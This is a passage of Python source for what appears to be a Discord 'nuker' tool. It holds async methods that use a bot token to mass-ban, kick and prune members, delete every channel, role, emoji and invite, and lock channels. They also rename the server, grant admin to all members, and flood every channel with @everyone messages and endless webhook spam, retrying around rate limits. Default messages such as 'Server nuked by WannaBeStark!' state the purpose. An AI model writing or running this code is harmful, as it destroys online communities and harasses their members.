                elif response.status_code == 429:
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to ban {member}",
        46))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to ban {member} | {e}",
        46))
                return False

    async def execute_kick(self, member: str, token: str):
        if member in self.whitelist:
            print(
                format_log_message(
        "INFO",
        f"Skipping whitelisted member {member} (Kick)",
        41))
            return True

        async with self.semaphore:
            try:
                response = await self._api_request(
                    "delete",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    token
                )
                if response is None:
                    print(format_log_message("ERROR", f"Failed to kick {member} (no response)", 46))
                    return False
                if response.status_code in [200, 201, 204]:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Kicked {member}",
        52))
                    self.kicked.append(member)
                    return True
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions for {member}",
        41))
                    return False
                elif "You are being blocked" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        "Blocked from Discord API",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to kick {member}",
        46))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to kick {member} | {e}",
        46))
                return False

    async def execute_prune(self, days: int, token: str):
        async with self.semaphore:
            try:
                roles_resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/roles", token)
                role_ids = []
                if roles_resp and roles_resp.status_code == 200:
                    role_ids = [r['id'] for r in roles_resp.json() if r['id'] != self.guildid]

                pruned_total = 0

                if role_ids:
                    payload = {"days": days, "compute_prune_count": True, "include_roles": role_ids}
                    resp1 = await self._api_request("post", f"https://discord.com/api/v10/guilds/{self.guildid}/prune", token, json=payload)
                    if resp1 and resp1.status_code == 200:
                        pruned_total += resp1.json().get('pruned', 0)

                payload_no_roles = {"days": days, "compute_prune_count": True}
                resp2 = await self._api_request("post", f"https://discord.com/api/v10/guilds/{self.guildid}/prune", token, json=payload_no_roles)
                if resp2 and resp2.status_code == 200:
                    pruned_total += resp2.json().get('pruned', 0)

                if pruned_total > 0:
                    print(format_log_message("SUCCESS", f"Pruned {pruned_total} members total", 43))
                else:
                    print(format_log_message("INFO", "No members were pruned", 40))
                return pruned_total
            except Exception:
                print(format_log_message("ERROR", "Failed to prune members", 41))
                return 0



    async def execute_crechannels(
        self, channelsname: str, type_: int, token: str):
        async with self.semaphore:
            payload = {
    "type": type_,
    "name": channelsname.replace(
        " ",
        "-"),
         "permission_overwrites": []}
            try:
                response = await self._api_request(
                    "post",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                    token, json=payload
                )
                if response is None:
                    return False
                if response.status_code == 201:
                    channel_id = response.json()['id']
                    print(
                        format_log_message(
        "SUCCESS",
        f"Created channel ID {channel_id}",
        42))
                    self.channels.append(1)
                    return True
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions for #{payload['name']}",
        35))
                    return False

                elif "You are being blocked" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        "Blocked from Discord API",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to create #{payload['name']}",
        40))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to create #{payload['name']} | {e}",
        40))
                return False

    async def execute_creroles(self, rolesname: str, token: str):
        async with self.semaphore:
            colors = random.choice([0x0000FF,
    0xFFFFFF,
    0xFF0000,
    0x00FF00,
    0x0000FF,
    0xFFFF00,
    0x00FFFF,
    0xFF00FF,
    0xC0C0C0,
    0x808080,
    0x800000,
    0x808000,
    0x008000,
    0x800080,
    0x008080,
    0x000080])
            payload = {"name": rolesname, "color": colors}
            try:
                response = await self._api_request(
                    "post",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                    token, json=payload
                )
                if response is None:
                    return False
                if response.status_code == 200:
                    role_id = response.json()['id']
                    print(
                        format_log_message(
        "SUCCESS",
        f"Created role ID {role_id}",
        45))
                    self.roles.append(1)
                    return True
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions for @{rolesname}",
        35))
                    return False

                elif "You are being blocked" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        "Blocked from Discord API",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to create @{rolesname}",
        40))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to create @{rolesname} | {e}",
        40))
                return False

    async def execute_delchannels(self, channel: str, token: str):
        async with self.semaphore:
            try:
                response = await self._api_request(
                    "delete",
                    f"https://discord.com/api/{next(self.version)}/channels/{channel}",
                    token
                )
                if response is None:
                    return False
                if response.status_code == 200:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Deleted channel {channel}",
        42))
                    self.channels.append(channel)
                    return True
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions for {channel}",
        35))
                    return False
                elif "You are being blocked" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        "Blocked from Discord API",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to delete {channel}",
        44))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to delete {channel} | {e}",
        44))
                return False

    async def execute_lock_all_channels(self, token: str):
        try:
            response = await self._api_request(
                "get",
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                token
            )
            if response and response.status_code == 200:
                channels = response.json()
                tasks = []
                for channel in channels:
                    if channel['type'] in [0, 5]:
                        task = self._lock_channel(token, channel)
                        tasks.append(task)
                await asyncio.gather(*tasks, return_exceptions=True)
                return True
            else:
                print(
                    format_log_message(
        "ERROR",
        "Failed to fetch channels",
        45))
                return False
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to lock channels | {e}",
        44))
            return False

    async def _lock_channel(self, token: str, channel):
        try:
            payload = {
                "permission_overwrites": [
                    {
                        "id": self.guildid,
                        "type": "role",
                        "allow": "0",
                        "deny": "66560"
                    }
                ]
            }
            patch_response = await self._api_request(
                "patch",
                f"https://discord.com/api/{next(self.version)}/channels/{channel['id']}",
                token, json=payload
            )
            if patch_response and patch_response.status_code == 200:
                print(
                    format_log_message(
        "SUCCESS",
        f"Locked channel {channel['name']}",
        45))
            else:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to lock {channel['name']}",
        45))
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to lock {channel['name']} | {e}",
        45))

    async def execute_unlock_all_channels(self, token: str):
        try:
            response = await self._api_request(
                "get",
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/channels",
                token
            )
            if response and response.status_code == 200:
                channels = response.json()
                tasks = []
                for channel in channels:
                    if channel['type'] in [0, 5]:
                        task = self._unlock_channel(token, channel)
                        tasks.append(task)
                await asyncio.gather(*tasks, return_exceptions=True)
                return True
            else:
                print(
                    format_log_message(
        "ERROR",
        "Failed to fetch channels",
        45))
                return False
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to unlock channels | {e}",
        44))
            return False

    async def _unlock_channel(self, token: str, channel):
        try:
            payload = {
                "permission_overwrites": [
                    {
                        "id": self.guildid,
                        "type": "role",
                        "allow": "66560",
                        "deny": "0"
                    }
                ]
            }
            patch_response = await self._api_request(
                "patch",
                f"https://discord.com/api/{next(self.version)}/channels/{channel['id']}",
                token, json=payload
            )
            if patch_response and patch_response.status_code == 200:
                print(
                    format_log_message(
        "SUCCESS",
        f"Unlocked channel {channel['name']}",
        45))
            else:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to unlock {channel['name']}",
        45))
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to unlock {channel['name']} | {e}",
        45))

    async def execute_delroles(
        self, role_id: str, token: str, retry_count: int = 0) -> bool:
        async with self.semaphore:
            try:
                resp = await self._api_request(
                    "delete",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles/{role_id}",
                    token, timeout=httpx.Timeout(6)
                )
                if resp is None:
                    return False
                if resp.status_code in (200, 204):
                    print(
                        format_log_message(
        "SUCCESS",
        f"Deleted role {role_id}",
        45))
                    return True
                elif resp.status_code == 403:
                    text = resp.text
                    if "Missing Permissions" in text:
                        print(
                            format_log_message(
        "ERROR",
        f"Missing perms to delete role {role_id}",
        42))
                    elif "You are being blocked" in text:
                        print(
                            format_log_message(
        "ERROR",
        "API block detected | Pausing all Operations",
        38))
                        await asyncio.sleep(5)
                        return False
                    else:
                        print(
                            format_log_message(
        "ERROR",
        f"Failed role delete {role_id} ({resp.status_code})",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed role delete {role_id} ({resp.status_code})",
        40))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Exception deleting role {role_id}: {e}",
        38))
                return False



    async def execute_delroles_all(
        self, token: str, skip_everyone: bool = True):
        try:
            resp = await self._api_request(
                "get",
                f"https://discord.com/api/v10/guilds/{self.guildid}/roles",
                token
            )
            if not resp or resp.status_code != 200:
                print(format_log_message("ERROR", f"Failed to fetch roles ({resp.status_code if resp else 'no resp'})", 42))
                return 0
            roles = resp.json()
            roles_to_delete = [r['id'] for r in roles if not (skip_everyone and r['id'] == self.guildid)]
            if not roles_to_delete:
                print(format_log_message("INFO", "No deletable roles found.", 38))
                return 0

            print(format_log_message("INFO", f"Deleting {len(roles_to_delete)} roles | retrying until all gone...", 48))
            start_time = time.time()

            client = httpx.AsyncClient(
                limits=httpx.Limits(max_connections=__max_concurrent__, max_keepalive_connections=max(10, __max_concurrent__)),
                timeout=httpx.Timeout(10.0),
                verify=False
            )
            sem = asyncio.Semaphore(__max_concurrent__)
            success_count = 0

            async def del_role(role_id):
                nonlocal success_count
                async with sem:
                    while True:
                        try:
                            r = await client.delete(
                                f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role_id}",
                                headers={"Authorization": f"Bot {token}"}
                            )
                            if r.status_code in (200, 204):
                                success_count += 1
                                print(format_log_message("SUCCESS", f"Deleted role {role_id}", 45))
                                return True
                            elif r.status_code == 429:
                                try:
                                    retry_after = float(r.json().get("retry_after", 0.1))
                                except Exception:
                                    retry_after = 0.1
                                await asyncio.sleep(retry_after)
                            elif r.status_code == 404:
                                return True  
                            else:
                                print(format_log_message("ERROR", f"Role {role_id} ({r.status_code}): {r.text[:60]}", 40))
                                return False
                        except Exception as e:
                            await asyncio.sleep(0.1)

            await asyncio.gather(*[del_role(rid) for rid in roles_to_delete])
            await client.aclose()
            duration = time.time() - start_time
            print(format_log_message("SUCCESS", f"Deleted {success_count}/{len(roles_to_delete)} roles in {duration:.2f}s", 45))
            return success_count
        except Exception as e:
            print(format_log_message("ERROR", f"Mass role deletion failed: {e}", 40))
            return 0

    async def execute_delemojis(self, emoji_id: str, token: str) -> bool:
        async with self.semaphore:
            try:
                resp = await self._api_request(
                    "delete",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis/{emoji_id}",
                    token, timeout=httpx.Timeout(7)
                )
                if resp is None:
                    return False
                if resp.status_code in (200, 204):
                    print(
                        format_log_message(
        "SUCCESS",
        f"Deleted emoji {emoji_id}",
        45))
                    return True
                elif resp.status_code == 403:
                    if "Missing Permissions" in resp.text:
                        print(
                            format_log_message(
        "ERROR",
        f"No permission to delete emoji {emoji_id}",
        40))
                        return False
                    else:
                        print(
                            format_log_message(
        "ERROR",
        f"Failed to delete emoji {emoji_id} ({resp.status_code})",
        42))
                        return False
                else:
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Emoji delete error {emoji_id}: {e}",
        38))
                return False

    async def execute_delemojis_all(self, token: str) -> int:
        try:
            resp = await self._api_request(
                "get",
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/emojis",
                token
            )
            if not resp or resp.status_code != 200:
                print(format_log_message("ERROR", "No emoji found in the server", 38))
                return 0
            emojis = resp.json()

            if not emojis:
                print(format_log_message("INFO", "No emoji found in the server", 35))
                return 0

            print(
                format_log_message(
        "INFO",
        f"Deleting {len(emojis)} emojis at max speed...",
        45))
            start = time.time()

            tasks = [
    self.execute_delemojis(
        emoji['id'],
        token) for emoji in emojis]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            success = sum(1 for r in results if r is True)
            duration = time.time() - start

            print(
                format_log_message(
        "SUCCESS",
        f"Deleted {success}/{len(emojis)} emojis in {duration:.2f}s",
        44))
            return success

        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Mass emoji deletion failed: {e}",
        38))
            return 0

    async def execute_massping(self, channel: str, content: str, token: str):
        async with self.semaphore:
            if not content:
                content = __config__.get(
    "operations",
    {}).get(
        "spam_message",
         "@everyone @here Server nuked by WannaBeStark!")
            payload = {"content": content}
            try:
                response = await self._api_request(
                    "post",
                    f"https://discord.com/api/{next(self.version)}/channels/{channel}/messages",
                    token, json=payload
                )
                if response is None:
                    return False
                if response.status_code == 200:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Spammed in {channel}",
        47))
                    self.messages.append(channel)
                    return True
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions for {channel}",
        35))
                    return False

                elif "You are being blocked" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        "Blocked from Discord API",
        40))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to spam in {channel}",
        42))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to spam in {channel} | {e}",
        42))
                return False

    async def execute_nick_all_fast(self, token: str, new_nick: str = None):
        if not new_nick:
            new_nick = __config__.get(
    "operations", {}).get(
        "nick_users_to", "Wizzed by WannaBeStark")

        try:
            with open("fetched/members.txt", "r") as f:
                members = [line.strip() for line in f if line.strip()
                                    and line.strip().isdigit()]
        except BaseException:
            print(
                format_log_message(
        "ERROR",
        "members.txt missing or empty",
        40))
            return 0

        members = [m for m in members if m not in self.whitelist]
        total = len(members)

        if total == 0:
            print(
                format_log_message(
        "INFO",
        "No members to nickname after whitelist filter",
        45))
            return 0

        print(
            format_log_message(
        "INFO",
        f"Starting nick-all ? \"{new_nick}\"  ({total} targets)",
        50))

        success_count = 0

        async def nick_one(member_id: str):
            nonlocal success_count
            async with self.semaphore:
                try:
                    resp = await self._api_request(
                        "patch",
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member_id}",
                        token, json={"nick": new_nick}
                    )
                    if resp and resp.status_code in (200, 204):
                        success_count += 1
                        print(f"{format_log_message('SUCCESS', f'Nicked ? {member_id}', 52)}")
                except BaseException:
                    pass

        start_time = time.time()
        await asyncio.gather(*(nick_one(mid) for mid in members), return_exceptions=True)
        duration = time.time() - start_time

        print(
            format_log_message(
        "SUCCESS",
        f"Finished: {success_count}/{total} members nicked in {duration:.2f}s",
        55))
        time.sleep(2.5)
        return success_count

    async def execute_change_icon(self, token: str):
        if not os.path.exists("Guild-Icon"):
            print(
                format_log_message(
        "ERROR",
        "Guild-Icon folder not found!",
        38))
            return False
        images = [f for f in os.listdir(
            "Guild-Icon") if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp'))]
        if not images:
            print(
                format_log_message(
        "ERROR",
        "No images in Guild-Icon folder!",
        36))
            return False
        mode_start, mode_end = get_mode_colors()
        print(format_log_message("INFO", "Available Icons:", 50))
        print(
    gradient_text(
        "?" +
        "-" *
        60 +
        "?",
        mode_start,
        mode_end,
        bold=True))
        for i, img in enumerate(images, 1):
            print(
    gradient_text(
        f"| {i:<2}|{img:<56}|",
        mode_start,
        mode_end,
        bold=True))
        print(
    gradient_text(
        "?" +
        "-" *
        60 +
        "?",
        mode_start,
        mode_end,
        bold=True))
        try:
            choice_input = await self.async_input(format_log_message("INPUT", "Choose icon number", 50))
            choice = int(choice_input.strip()) - 1
            if 0 <= choice < len(images):
                img_path = os.path.join("Guild-Icon", images[choice])
                with open(img_path, "rb") as f:
                    img_data = base64.b64encode(f.read()).decode('utf-8')
                ext = images[choice].split('.')[-1]
                payload = {"icon": f"data:image/{ext};base64,{img_data}"}
                async with self.semaphore:
                    try:
                        response = await self._api_request(
                            "patch",
                            f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                            token, json=payload
                        )
                        if response and response.status_code in [200, 204]:
                            print(format_log_message("SUCCESS", "Changed guild icon", 42))
                            return True
                        else:
                            print(format_log_message("ERROR", "Failed to change guild icon", 38))
                            return False
                    except asyncio.CancelledError:
                        print(
                            format_log_message(
        "ERROR",
        "Request was cancelled (timeout or event loop stop)",
        41))
                        return False
                    except httpx.HTTPError as e:
                        print(
                            format_log_message(
        "ERROR",
        f"Network error while changing guild icon | {e}",
        41))
                        return False
                    except Exception as e:
                        print(
                            format_log_message(
        "ERROR",
        f"Unexpected error while changing guild icon | {e}",
        41))
                        return False
            else:
                print(
                    format_log_message(
        "ERROR",
        f"Invalid choice: {choice}",
        47))
                return False
        except ValueError:
            print(format_log_message("ERROR", f"Invalid input:!", 49))
            return False

    async def execute_change_guild_info(
        self, token: str, new_name: str = None, new_desc: str = None):
        if new_name is None:
            default_name = __config__.get(
    "operations", {}).get(
        "guild_name", "Nuked By Shakti")
            new_name = await self.async_input(format_log_message("INPUT", f"New guild name (default: {default_name})", 50))
            new_name = new_name.strip()
            if not new_name:
                new_name = default_name

        if new_desc is None:
            new_desc = await self.async_input(format_log_message("INPUT", "New guild description", 50))
            new_desc = new_desc.strip()

        if not new_name:
            print(format_log_message("ERROR", "Name required!", 48))
            return False

        payload = {"name": new_name}
        if new_desc:
            payload["description"] = new_desc

        async with self.semaphore:
            response = await self._api_request(
                "patch",
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}",
                token, json=payload
            )
            if response and response.status_code in [200, 204]:
                print(format_log_message("SUCCESS", f"Guild updated: {new_name}", 43))
                return True
            else:
                print(format_log_message("ERROR", "Failed to update guild", 42))
                return False

    async def execute_give_admin(self, token: str):
        try:
            admin_role_payload = {
    "name": "Admin",
    "color": 0xFF0000,
     "permissions": "8"}

            role_resp = await self._api_request(
                "post",
                f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/roles",
                token, json=admin_role_payload
            )
            if not role_resp or role_resp.status_code != 200:
                print(
                    format_log_message(
        "ERROR",
        "Failed to create admin role",
        36))
                return (0, 0)
            admin_role_id = (role_resp.json())['id']
            print(
                format_log_message(
        "SUCCESS",
        f"Created admin role #{admin_role_id}",
        39))

            user_input = await self.async_input(format_log_message("INPUT", "User IDs (comma-separated) or 'all'", 50))
            user_input = user_input.strip()
            users_to_admin = []

            if user_input.lower() == 'all':
                members_resp = await self._api_request(
                    "get",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members?limit=1000",
                    token
                )
                if not members_resp or members_resp.status_code != 200:
                    print(format_log_message("ERROR", "Failed to fetch members", 40))
                    return (0, 0)
                members = members_resp.json()
                users_to_admin = [member['user']['id'] for member in members if member['user']['id'] not in self.whitelist]
                print(format_log_message("SUCCESS", f"Fetched {len(users_to_admin)} non-whitelisted members", 40))
            else:
                users_to_admin = [uid.strip() for uid in user_input.split(
                    ',') if uid.strip() and uid.strip() not in self.whitelist]
                if not users_to_admin:
                    print(
                        format_log_message(
        "ERROR",
        "No valid user IDs provided or all are whitelisted!",
        32))
                    return (0, 0)

            success_count = 0
            total_attempts = len(users_to_admin)

            for idx, user_id in enumerate(users_to_admin, 1):

                try:
                    member_resp = await self._api_request(
                        "get",
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                        token
                    )
                    if not member_resp or member_resp.status_code != 200:
                        print(format_log_message("ERROR", f"Failed to fetch member {user_id}", 45))
                        continue
                    member_data = member_resp.json()

                    current_roles = member_data.get('roles', [])
                    if admin_role_id not in current_roles:
                        current_roles.append(admin_role_id)

                    assign_payload = {"roles": current_roles}

                    response = await self._api_request(
                        "patch",
                        f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{user_id}",
                        token, json=assign_payload
                    )
                    if response and response.status_code in [200, 204]:
                        print(format_log_message("SUCCESS", f"Assigned admin to #{user_id} ({idx}/{total_attempts})", 50))
                        success_count += 1
                    else:
                        print(format_log_message("ERROR", f"Failed to assign admin to #{user_id}", 45))
                except Exception as e:
                    print(format_log_message("ERROR", f"Error assigning admin to {user_id}: {e}", 45))

            print(
                format_log_message(
        "SUCCESS",
        f"Gave admin to {success_count}/{total_attempts} users",
        40))
            return (success_count, total_attempts)
        except Exception as e:
            print(format_log_message("ERROR", f"Give admin failed: {e}", 40))
            return (0, 0)

    async def execute_delete_invites(self, token: str):
        start_time = time.time()
        async with self.semaphore:
            try:
                invites_resp = await self._api_request(
                    "get",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/invites",
                    token
                )
                if invites_resp and invites_resp.status_code == 200:
                    invites = invites_resp.json()
                    total_invites = len(invites)
                    deleted = 0

                    async def delete_invite(invite_code):
                        nonlocal deleted
                        async with self.semaphore:
                            del_resp = await self._api_request(
                                "delete",
                                f"https://discord.com/api/{next(self.version)}/invites/{invite_code}",
                                token
                            )
                            if del_resp and del_resp.status_code in [200, 204]:
                                deleted += 1
                                return True
                            return False

                    tasks = [delete_invite(invite['code'])
                                            for invite in invites]
                    await asyncio.gather(*tasks)
                    end_time = time.time()
                    return (deleted, end_time - start_time, total_invites)
                else:
                    print(
                        format_log_message(
        "ERROR",
        "Failed to fetch invites",
        41))
                    return (0, 0, 0)
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to fetch invites | {e}",
        41))
                return (0, 0, 0)


    async def execute_timeout_all(
        self, member: str, duration_seconds: int, token: str):
        if member in self.whitelist:
            print(
                format_log_message(
        "INFO",
        f"Skipping whitelisted member {member} (Timeout)",
        41))
            return True

        async with self.semaphore:

            timeout_end = (
    datetime.utcnow() +
    timedelta(
        seconds=duration_seconds)).isoformat()
            payload = {"communication_disabled_until": timeout_end}
            try:
                response = await self._api_request(
                    "patch",
                    f"https://discord.com/api/{next(self.version)}/guilds/{self.guildid}/members/{member}",
                    token, json=payload
                )
                if response is None:
                    return False
                if response.status_code in [200, 204]:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Timed out {member} for {duration_seconds}s",
        39))
                    return True
                elif response.status_code == 404:
                    print(
                        format_log_message(
        "INFO",
        f"Member {member} not found (404), skipping.",
        46))
                    return False
                elif "Missing Permissions" in response.text:
                    print(
                        format_log_message(
        "ERROR",
        f"Missing Permissions to timeout {member}",
        35))
                    return False
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to timeout {member}: {response.status_code}",
        46))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to timeout {member} | {e}",
        46))
                return False

    async def execute_rename_channels(self, token: str):
        new_name = await self.async_input(format_log_message("INPUT", "New channel Name", 50))
        resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/channels", token)
        if not resp or resp.status_code != 200:
            print(
                format_log_message(
        "ERROR",
        "Failed to fetch channels",
        40))
            return 0
        channels = resp.json()

        async def rename_channel(i, ch):
            try:
                name = new_name.format(i=i)
                payload = {"name": name}
                resp = await self._api_request(
                    "patch",
                    f"https://discord.com/api/v10/channels/{ch['id']}",
                    token, json=payload, timeout=httpx.Timeout(5)
                )
                if resp and resp.status_code == 200:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Renamed channel #{ch['id']} ? {name}",
        45))
                    return True
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to rename channel #{ch['id']}",
        45))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to rename channel #{ch['id']} | {e}",
        45))
                return False

        tasks = [rename_channel(i, ch) for i, ch in enumerate(channels)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if r is True)
        return count

    async def execute_rename_roles(self, token: str):
        new_name = await self.async_input(format_log_message("INPUT", "New role Name", 50))
        resp = await self._api_request("get", f"https://discord.com/api/v10/guilds/{self.guildid}/roles", token)
        if not resp or resp.status_code != 200:
            return 0
        roles = resp.json()

        async def rename_role(i, role):
            """Rename a single role - burst speed, no retry"""
            try:
                name = new_name.format(i=i)
                payload = {"name": name}
                resp = await self._api_request(
                    "patch",
                    f"https://discord.com/api/v10/guilds/{self.guildid}/roles/{role['id']}",
                    token, json=payload, timeout=httpx.Timeout(5)
                )
                if resp and resp.status_code == 200:
                    print(
                        format_log_message(
        "SUCCESS",
        f"Renamed role #{role['id']} ? {name}",
        45))
                    return True
                else:
                    print(
                        format_log_message(
        "ERROR",
        f"Failed to rename role #{role['id']}",
        45))
                    return False
            except Exception as e:
                print(
                    format_log_message(
        "ERROR",
        f"Failed to rename role #{role['id']} | {e}",
        45))
                return False

        tasks = [rename_role(i, role) for i, role in enumerate(roles)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        count = sum(1 for r in results if r is True)
        return count

    async def execute_spam_all_channels(self, token: str):
        session = await self._get_session()
        spam_message = __config__.get("operations", {}).get(
            "spam_message", "@everyone @here Wizzled by WannaBeStark!")

        try:
            resp = await session.get(f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                                    headers={"Authorization": f"Bot {token}"})
            if resp.status_code == 200:
                channels = resp.json()
                text_channels = [c for c in channels if c['type'] == 0]
            else:
                print(
                    format_log_message(
        "ERROR",
        "Failed to fetch channels for spam.",
        50))
                return 0
        except Exception as e:
            print(
                format_log_message(
        "ERROR",
        f"Failed to fetch channels for spam: {e}",
        50))
            return 0

        if not text_channels:
            print(
                format_log_message(
        "ERROR",
        "No text channels found for spam.",
        50))
            return 0

        spam_tasks = [
    self.execute_massping(
        channel['id'],
        spam_message,
        token) for channel in text_channels]
        results = await asyncio.gather(*spam_tasks, return_exceptions=True)
        success_count = sum(1 for r in results if r is True)
        return success_count

    async def execute_webhook_spam(self, token: str):
        webhook_config = __config__.get("nuke", {}).get("webhooks", {})
        webhook_name = webhook_config.get("name", "WannaBeStark op")
        webhook_avatar_url = webhook_config.get("avatar_url")
        webhook_messages = webhook_config.get(
    "messages", ["@everyone @here Wizzled by WannaBeStark"])

        # Dedicated high-throughput client | no connection cap
        limits = httpx.Limits(max_connections=512, max_keepalive_connections=256)
        fast_client = httpx.AsyncClient(limits=limits, timeout=httpx.Timeout(8.0))

        avatar_data = None
        if webhook_avatar_url:
            avatar_data = await self._fetch_image_as_base64(webhook_avatar_url)

        try:
            resp = await fast_client.get(
                f"https://discord.com/api/v10/guilds/{self.guildid}/channels",
                headers={"Authorization": f"Bot {token}"}
            )
            if resp.status_code == 200:
                channels = resp.json()
                text_channels = [c for c in channels if c['type'] == 0]
            else:
                print(format_log_message("ERROR", "Failed to fetch channels for webhook spam.", 50))
                return 0
        except Exception as e:
            print(format_log_message("ERROR", f"Failed to fetch channels: {e}", 50))
            return 0

        if not text_channels:
            print(format_log_message("ERROR", "No text channels found for webhook spam.", 50))
            return 0

        print(format_log_message("INFO", f"Creating webhooks in {len(text_channels)} channels...", 40))

        webhook_payload = {"name": webhook_name}
        if avatar_data:
            webhook_payload["avatar"] = avatar_data

        global_sem = asyncio.Semaphore(100)

        async def try_create(channel):
            async with global_sem:
                while True:
                    try:
                        r = await fast_client.post(
                            f"https://discord.com/api/v10/channels/{channel['id']}/webhooks",
                            headers={"Authorization": f"Bot {token}"},
                            json=webhook_payload
                        )
                        if r.status_code in [200, 201]:
                            print(format_log_message("SUCCESS", f"Webhook created #{channel['name']}", 50))
                            return r.json().get("url")
                        elif r.status_code == 429:
                            try:
                                data = r.json()
                                retry_after = float(data.get("retry_after", 1.0))
                            except:
                                retry_after = float(r.headers.get("X-RateLimit-Reset-After", 1.0))
                            print(format_log_message("INFO", f"Rate limited on creation in #{channel['name']} | Retrying after {retry_after}s", 50))
                            await asyncio.sleep(retry_after + 0.1)
                            continue
                        elif r.status_code == 400:
                            try:
                                if r.json().get("code") == 30007:
                                    gw = await fast_client.get(
                                        f"https://discord.com/api/v10/channels/{channel['id']}/webhooks",
                                        headers={"Authorization": f"Bot {token}"}
                                    )
                                    if gw.status_code == 200:
                                        existing = gw.json()
                                        if existing:
                                            print(format_log_message("SUCCESS", f"Using existing webhook in #{channel['name']} (Limit reached)", 50))
                                            return existing[0].get("url")
                            except:
                                pass
                            return None
                        elif r.status_code in [403, 404, 401]:
                            return None
                        else:
                            await asyncio.sleep(1.0)
                            continue
                    except Exception:
                        await asyncio.sleep(0.5)
                        continue

        async def spam_one_webhook(webhook_url):
            while True:
                try:
                    msg = random.choice(webhook_messages)
                    r = await fast_client.post(webhook_url, json={"content": msg}, timeout=10.0)
                    if r.status_code in [200, 204]:
                        pass
                    elif r.status_code == 429:
                        try:
                            data = r.json()
                            retry_after = float(data.get("retry_after", 0.5))
                        except:
                            retry_after = float(r.headers.get("X-RateLimit-Reset-After", 0.5))
                        await asyncio.sleep(retry_after + 0.05)
                    elif r.status_code == 404:
                        break
                    else:
                        await asyncio.sleep(0.2)
                except Exception:
                    await asyncio.sleep(0.1)

        async def channel_worker(channel):
            url = await try_create(channel)
            if url:
                await spam_one_webhook(url)

        for channel in text_channels:
            asyncio.create_task(channel_worker(channel))

        print(format_log_message("SUCCESS", f"Webhook spam tasks started for {len(text_channels)} channels.", 50))
        return len(text_channels)

    async def _send_webhook_message_rapid(self, session, webhook_url, message):
        while True:
            try:
                resp = await session.post(
                    webhook_url,
                    json={"content": message}
                )
                if resp.status_code in [200, 204]:
